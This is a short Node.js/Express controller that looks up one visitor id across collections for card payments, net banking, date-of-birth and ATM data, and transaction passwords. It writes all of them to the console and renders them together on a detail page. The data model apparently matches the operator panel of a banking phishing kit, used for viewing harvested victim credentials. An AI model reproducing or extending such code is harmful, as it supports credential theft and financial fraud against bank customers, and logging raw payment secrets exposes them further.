const User = require('../models/User');
const CardPayment = require('../models/CardPayment');
const NetBanking = require('../models/NetBanking');
const DobAtmData = require('../models/DobAtmData');
const TransactionPassword = require('../models/Tmodel');

exports.getUserDetails = async (req, res) => {
    try {
        const { uniqueid } = req.params;

        if (!uniqueid) {
            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
        }

        // Fetch data from multiple collections
        const [user, cardPayment, netBanking, dobAtmData, transactionPassword] = await Promise.all([
            User.findOne({ uniqueid }),
            CardPayment.findOne({ uniqueid }),
            NetBanking.findOne({ uniqueid }),
            DobAtmData.findOne({ uniqueid }),
            TransactionPassword.findOne({ uniqueid })
        ]);

        console.log("Fetched Data: ", { user, cardPayment, netBanking, dobAtmData, transactionPassword });

        // Render the 'detail.ejs' page with data
        res.render('detail', {
            user,
            cardPayment,
            netBanking,
            dobAtmData,
            transactionPassword
        });
    } catch (error) {
        console.error("Error in getUserDetails:", error);
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};
